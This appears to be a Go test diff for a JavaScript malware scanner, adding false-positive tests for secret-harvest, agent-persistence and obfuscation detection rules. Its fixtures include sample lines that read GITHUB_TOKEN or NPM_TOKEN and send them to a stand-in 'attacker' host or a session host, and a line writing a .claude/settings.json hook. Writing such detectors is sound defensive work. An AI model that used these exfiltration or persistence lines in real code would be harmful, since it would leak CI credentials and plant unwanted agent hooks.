@@ -2,6 +2,7 @@ package jsrisk
 
 import (
 	"context"
+	"fmt"
 	"strings"
 	"testing"
 
@@ -2658,5 +2659,130 @@ const help = 'chmod after fs.writeFileSync to stage the bundle';`,
 				}
 			}
 		})
+	}
+}
+
+// TestLexicalHardening_FPReduction covers the shared lexical view: signals
+// in comments, regex literals, or example strings must not fire, while the
+// same signal in real executable code still does.
+func TestLexicalHardening_FPReduction(t *testing.T) {
+	cases := []struct {
+		name, content, rule string
+		want                bool
+	}{
+		// --- JS_CI_SECRET_HARVEST_001: secret read + sink ---
+		{
+			name:    "fetch in comment + real secret read: no harvest",
+			content: "const t = process.env.GITHUB_TOKEN;\n// fetch('https://attacker', { body: t })\n",
+			rule:    RuleCISecretHarvest, want: false,
+		},
+		{
+			name:    "secret read in comment + real fetch: no harvest",
+			content: "// const t = process.env.GITHUB_TOKEN\nfetch('https://attacker', { body: 'x' });\n",
+			rule:    RuleCISecretHarvest, want: false,
+		},
+		{
+			name:    "fetch inside a string + real secret read: no harvest",
+			content: "const usage = \"fetch('https://attacker')\";\nconst t = process.env.GITHUB_TOKEN;\n",
+			rule:    RuleCISecretHarvest, want: false,
+		},
+		{
+			name:    "regex literal /fetch(/ + real secret read: no harvest",
+			content: "const re = /fetch\\(/;\nconst t = process.env.GITHUB_TOKEN;\n",
+			rule:    RuleCISecretHarvest, want: false,
+		},
+		{
+			name:    "real fetch + real secret read: harvest fires",
+			content: "const t = process.env.GITHUB_TOKEN;\nfetch('https://attacker', { body: t });\n",
+			rule:    RuleCISecretHarvest, want: true,
+		},
+		{
+			name:    "template interpolation with real secret + fetch: harvest fires",
+			content: "fetch(`https://attacker/${process.env.GITHUB_TOKEN}`);\n",
+			rule:    RuleCISecretHarvest, want: true,
+		},
+		// --- registry host: broad partner signal (presence on masked code) ---
+		{
+			// A host only in a COMMENT no longer counts (masked).
+			name:    "registry host only in a comment + secret read: no harvest",
+			content: "const t = process.env.NPM_TOKEN;\n// exfil to registry.npmjs.org/-/npm/v1/tokens\n",
+			rule:    RuleCISecretHarvest, want: false,
+		},
+		{
+			// A host in a (non-comment) string is a broad partner: it fires
+			// with a real secret read, independent of the HTTP client used.
+			name:    "registry host in a string + secret read: harvest fires",
+			content: "const url = 'https://registry.npmjs.org/-/npm/v1/tokens';\nconst t = process.env.NPM_TOKEN;\nrequest.post(url, { body: t });\n",
+			rule:    RuleCISecretHarvest, want: true,
+		},
+		{
+			name:    "session host via an unmodeled client + secret read: harvest fires",
+			content: "const t = process.env.GITHUB_TOKEN;\nsuperagent.post('https://filev2.getsession.org/', t);\n",
+			rule:    RuleCISecretHarvest, want: true,
+		},
+		// --- AGENT_PERSISTENCE_001: .claude path ---
+		{
+			name:    "claude path in a comment: no persistence",
+			content: "// writes .claude/settings.json on install\nmodule.exports = {};\n",
+			rule:    RuleAgentPersistence, want: false,
+		},
+		{
+			name:    "real write of .claude/settings.json: persistence fires",
+			content: "require('fs').writeFileSync('.claude/settings.json', JSON.stringify(hook));\n",
+			rule:    RuleAgentPersistence, want: true,
+		},
+		// --- JS_OBF_001 FP: obfuscator marker in a comment ---
+		{
+			name:    "while(!![]) in a comment is not obfuscation",
+			content: "// obfuscators emit while(!![]) loops\nmodule.exports = 1;\n",
+			rule:    RuleObfuscation, want: false,
+		},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			got := hasRule(analyze(t, "index.js", c.content), c.rule)
+			if got != c.want {
+				t.Errorf("%s present = %v, want %v (findings: %+v)", c.rule, got, c.want, analyze(t, "index.js", c.content))
+			}
+		})
+	}
+}
+
+func BenchmarkComputeMetrics(b *testing.B) {
+	// A moderately large, minified-ish payload with strings, comments, and
+	// real calls, to exercise the single shared lexical pass.
+	var sb strings.Builder
+	sb.WriteString("const cp=require('child_process');\n")
+	for i := 0; i < 2000; i++ {
+		sb.WriteString("// comment line with fetch('https://x') and process.env.TOKEN example\n")
+		sb.WriteString("const _0xabc")
+		sb.WriteString("=function(a,b){return a+b};\n")
+		sb.WriteString("doThing('some string with registry.npmjs.org inside');\n")
+	}
+	sb.WriteString("fetch('https://attacker/'+process.env.GITHUB_TOKEN);\n")
+	content := []byte(sb.String())
+	b.ReportAllocs()
+	b.ResetTimer()
+	for i := 0; i < b.N; i++ {
+		_ = computeMetrics(content)
+	}
+}
+
+// TestObfHexCount_NotSuppressedByStringExamples locks the obfuscator-cap
+// fix: real code hex identifiers must be counted even when preceded by
+// many stringified _0x examples (which are filtered out as data).
+func TestObfHexCount_NotSuppressedByStringExamples(t *testing.T) {
+	var sb strings.Builder
+	sb.WriteString("const examples = [")
+	for i := 0; i < 150; i++ { // 150 stringified examples: must NOT count
+		sb.WriteString("'_0xa1b2c3',")
+	}
+	sb.WriteString("];\n")
+	for i := 0; i < 120; i++ { // 120 real code identifiers: must count
+		fmt.Fprintf(&sb, "var _0x%04x = %d;\n", i, i)
+	}
+	m := computeMetrics([]byte(sb.String()))
+	if m.HexIdentifierCount <= hexIdentifierThreshold {
+		t.Errorf("HexIdentifierCount = %d, want > %d (real code idents counted past string examples)", m.HexIdentifierCount, hexIdentifierThreshold)
 	}
 }
